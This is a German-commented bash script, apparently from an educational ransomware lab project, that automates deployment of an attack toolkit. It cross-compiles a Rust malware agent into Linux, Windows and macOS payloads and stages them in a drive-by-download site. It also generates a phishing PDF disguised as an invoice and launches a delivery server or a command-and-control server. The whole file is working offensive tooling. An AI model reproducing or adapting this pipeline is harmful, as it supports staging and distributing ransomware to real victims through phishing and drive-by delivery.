#!/bin/bash

# ==========================================
#  EDU-RANSOMWARE DEPLOYMENT AUTOMATION
# ==========================================

# Farben für Output
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Pfade (Relativ zum Skript)
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AGENT_DIR="$ROOT_DIR/malware_agent"
DELIVERY_DIR="$ROOT_DIR/delivery/DbD-Site"
FILES_DIR="$DELIVERY_DIR/files"
PDF_DIR="$ROOT_DIR/delivery/pdf_phishing"
C2_DIR="$ROOT_DIR/c2_server"

print_status() { echo -e "${BLUE}[*] $1${NC}"; }
print_success() { echo -e "${GREEN}[+] $1${NC}"; }
print_error() { echo -e "${RED}[!] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }

# Vorbereitung & Namens-Check
# ------------------------------------------
print_status "Bereite Verzeichnisse vor..."
mkdir -p "$FILES_DIR"

if ! command -v cargo &>/dev/null; then
  print_error "Rust (cargo) ist nicht installiert!"
  exit 1
fi

# In den Agent Ordner wechseln, um Cargo.toml zu lesen
if [ ! -d "$AGENT_DIR" ]; then
  print_error "Agent Verzeichnis nicht gefunden: $AGENT_DIR"
  exit 1
fi
cd "$AGENT_DIR" || exit

# --- FIX: Namen aus Cargo.toml auslesen ---
BINARY_NAME=$(grep -m 1 '^name =' Cargo.toml | cut -d '"' -f 2)
if [ -z "$BINARY_NAME" ]; then
  print_error "Konnte 'name' nicht aus Cargo.toml lesen. Bitte manuell im Skript setzen."
  exit 1
fi
print_status "Projekt-Name erkannt als: '$BINARY_NAME'"

# Kompilierung LINUX
# ------------------------------------------
print_status "Kompiliere Agent für LINUX..."
if cargo build --release; then
  # Prüfen, ob die Datei wirklich da ist
  if [ -f "target/release/$BINARY_NAME" ]; then
    cp "target/release/$BINARY_NAME" "$FILES_DIR/payload_linux"
    print_success "Linux Payload bereitgestellt."
  else
    print_error "Build erfolgreich, aber Datei 'target/release/$BINARY_NAME' nicht gefunden."
    print_warning "Heißt das Binary vielleicht anders? Prüfe den 'target/release' Ordner."
    ls target/release
  fi
else
  print_error "Linux Kompilierung fehlgeschlagen."
  exit 1
fi

# Kompilierung WINDOWS
# ------------------------------------------
print_status "Kompiliere Agent für WINDOWS (Cross-Compile)..."
# Check ob Target installiert ist
if ! rustup target list --installed | grep "x86_64-pc-windows-gnu" >/dev/null; then
  print_warning "Windows Target fehlt. Versuche Installation..."
  rustup target add x86_64-pc-windows-gnu
fi

if cargo build --release --target x86_64-pc-windows-gnu; then
  if [ -f "target/x86_64-pc-windows-gnu/release/$BINARY_NAME.exe" ]; then
    cp "target/x86_64-pc-windows-gnu/release/$BINARY_NAME.exe" "$FILES_DIR/payload_win.exe"
    print_success "Windows Payload bereitgestellt."
  else
    print_error "Windows Binary 'target/x86_64-pc-windows-gnu/release/$BINARY_NAME.exe' nicht gefunden."
  fi
else
  print_warning "Windows Kompilierung fehlgeschlagen (Fehlt MinGW?). Überspringe."
fi

# Kompilierung MACOS (Mock/Real)
# ------------------------------------------
print_status "Prüfe MacOS Build..."
# Code erstelllt vermutlich einen Dummy
if [[ "$OSTYPE" == "darwin"* ]]; then
  if cargo build --release; then
    cp "target/release/$BINARY_NAME" "$FILES_DIR/payload_mac"
    print_success "MacOS Payload bereitgestellt."
  fi
else
  if rustup target list --installed | grep "x86_64-apple-darwin" >/dev/null; then
    if cargo build --release --target x86_64-apple-darwin; then
      cp "target/x86_64-apple-darwin/release/$BINARY_NAME" "$FILES_DIR/payload_mac"
      print_success "MacOS Payload (Cross) bereitgestellt."
    else
      print_warning "MacOS Cross-Build fail. Erstelle Dummy."
      echo "Dummy Mac Payload" >"$FILES_DIR/payload_mac"
    fi
  else
    print_warning "Kein MacOS Target. Erstelle Dummy-Datei."
    echo "Dummy Mac Payload" >"$FILES_DIR/payload_mac"
  fi
fi

# PDF Generierung (MIT VENV)
# ------------------------------------------
print_status "Generiere frisches Phishing-PDF..."
cd "$PDF_DIR" || exit

VENV_ACTIVATED=0
if [ -f ".venv/bin/activate" ]; then
  source .venv/bin/activate
  VENV_ACTIVATED=1
elif [ -f "../.venv/bin/activate" ]; then
  source ../.venv/bin/activate
  VENV_ACTIVATED=1
fi

if python3 generate_phishing_pdf.py; then
  PDF_NAME="Rechnung_2025_Dezember.pdf"
  TARGET_PDF="$DELIVERY_DIR/public/$PDF_NAME"
  mkdir -p "$DELIVERY_DIR/public"

  if [ -f "$PDF_NAME" ]; then
    cp "$PDF_NAME" "$TARGET_PDF"
    print_success "PDF aktualisiert."
  else
    print_error "PDF ($PDF_NAME) nicht vom Python-Script erstellt."
  fi
else
  print_error "Fehler bei der PDF Generierung."
fi

if [ $VENV_ACTIVATED -eq 1 ]; then deactivate; fi

#  Abschluss
echo ""
echo -e "${GREEN}DEPLOYMENT COMPLETE${NC}"
echo "Inhalt von $FILES_DIR:"
ls -lh "$FILES_DIR" | grep "payload"
echo ""

# Start Optionen (gleich wie vorher)
echo "1) Delivery Server starten"
echo "2) C2 Server starten"
echo "3) Beenden"
read -p "Auswahl: " choice
case $choice in
1) cd "$DELIVERY_DIR" && python3 server.py ;;
2) cd "$C2_DIR" && python3 server.py ;;
*) exit 0 ;;
esac
